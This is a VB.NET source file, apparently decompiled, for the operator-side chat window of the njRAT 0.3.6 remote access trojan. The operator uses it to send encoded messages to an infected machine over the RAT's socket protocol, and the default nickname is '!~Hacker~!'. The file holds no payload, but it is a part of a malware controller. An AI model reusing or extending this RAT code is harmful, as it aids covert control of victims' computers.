Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports njRAT_0._3._6.njRAT

Public Class Chat
    Public hk As String
    Public osk As Client
    Public sk As Client

    Public Sub New()
        Me.hk = "!~Hacker~!"
        Me.InitializeComponent()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If (Me.T2.Text <> "") Then
            Dim chat As Chat = Me
            SyncLock chat
                Me.T1.SelectionStart = Me.T1.TextLength
                Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
                Me.T1.AppendText(("[" & Me.hk & "] "))
                Me.T1.SelectionFont = Me.T1.Font
                Me.T1.AppendText((Me.T2.Text & ChrW(13) & ChrW(10)))
                Me.T1.SelectionStart = Me.T1.TextLength
                Me.T1.ScrollToCaret()
                Dim box As TextBox = Me.T2
                Dim text As String = box.Text
                box.Text = [text]
                Me.sk.Send(("!" & ind.Y & FN.ENB([text])))
                Me.T2.Text = ""
            End SyncLock
        End If
    End Sub

    Private Sub Chat_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Me.sk.Send("@")
        Me.sk.CN = False
    End Sub

    Private Sub Chat_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.Text = Conversions.ToString(ind.vno(Me.osk.L))
        Me.Show()
        Dim str As String = Interaction.InputBox("Enter Your NickName", "Chat", Me.hk, -1, -1)
        If (str = "") Then
            Me.sk.CN = False
        Else
            Me.hk = str
            Me.sk.Send(("~" & ind.Y & FN.ENB(Me.hk)))
        End If
        Me.Timer1.Enabled = True
        Me.T2.Select()
        Me.T2.Focus()
    End Sub

    Private Sub T1_LinkClicked(sender As Object, e As LinkClickedEventArgs) Handles T1.LinkClicked
        Try
            Process.Start(e.LinkText)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub T2_KeyDown(sender As Object, e As KeyEventArgs) Handles T2.KeyDown
        If (e.KeyCode = Keys.Enter) Then
            e.SuppressKeyPress = True
            If (Me.T2.Text = "") Then
                Return
            End If
            Dim chat As Chat = Me
            SyncLock chat
                Me.T1.SelectionStart = Me.T1.TextLength
                Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
                Me.T1.AppendText(("[" & Me.hk & "] "))
                Me.T1.SelectionFont = Me.T1.Font
                Me.T1.AppendText((Me.T2.Text & ChrW(13) & ChrW(10)))
                Me.T1.SelectionStart = Me.T1.TextLength
                Me.T1.ScrollToCaret()
                Dim box As TextBox = Me.T2
                Dim text As String = box.Text
                box.Text = [text]
                Me.sk.Send(("!" & ind.Y & FN.ENB([text])))
                Me.T2.Text = ""
                Return
            End SyncLock
        End If
        Me.T2.Select()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If ((Me.sk Is Nothing) Or (Me.osk Is Nothing)) Then
            If (Me.T2.Enabled Or (Me.T1.Text = "")) Then
                Me.T1.AppendText("Disconnected ...")
            End If
            Me.T2.Enabled = False
            Me.Button1.Enabled = False
            Me.sk.Send("@")
            Me.sk.CN = False
        ElseIf (Not Me.sk.CN Or Not Me.osk.CN) Then
            If (Me.T2.Enabled Or (Me.T1.Text = "")) Then
                Me.T1.AppendText("Disconnected ...")
            End If
            Me.T2.Enabled = False
            Me.Button1.Enabled = False
            Me.sk.Send("@")
            Me.sk.CN = False
        End If
    End Sub
End Class